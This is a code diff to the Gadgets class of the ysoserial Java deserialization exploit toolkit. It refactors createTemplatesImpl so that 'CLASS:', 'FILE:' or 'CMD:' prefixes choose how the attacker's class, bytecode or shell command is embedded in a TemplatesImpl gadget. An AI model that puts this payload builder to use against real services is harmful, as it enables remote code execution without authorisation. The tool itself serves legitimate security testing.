@@ -11,7 +11,9 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.apache.wicket.util.file.Files;
 
+import java.io.File;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
@@ -62,31 +64,33 @@ public class Gadgets {
         return map;
     }
 
-    public static Object createTemplatesImpl(final String command) throws Exception {
+    public static Object createTemplatesImpl(String command) throws Exception {
+        Class tplClass;
+        Class abstTranslet;
+        Class transFactory;
+
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
-            return createTemplatesImpl(null, command, null, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
+            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
+        } else {
+            tplClass = TemplatesImpl.class;
+            abstTranslet = AbstractTranslet.class;
+            transFactory = TransformerFactoryImpl.class;
         }
 
-        return createTemplatesImpl(null, command, null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
-    }
-
-    public static Object createTemplatesImpl(final Class clazz) throws Exception {
-        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
-            return createTemplatesImpl(clazz, null, null,
-
-                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        if (command.startsWith("CLASS:")) {
+            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6));
+            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
+        } else if (command.startsWith("FILE:")) {
+            byte[] bs = Files.readBytes(new File(command.substring(5)));
+            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
+        } else {
+            if (command.startsWith("CMD:")) command = command.substring(4);
+            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
         }
-
-        return createTemplatesImpl(clazz, null, null, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
-    public static Object createTemplatesImpl(final byte[] bytes) throws Exception {
-        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
-            return createTemplatesImpl(null, null, bytes, Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
-        }
-
-        return createTemplatesImpl(null, null, bytes, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
-    }
 
     public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
         final T templates = tplClass.newInstance();
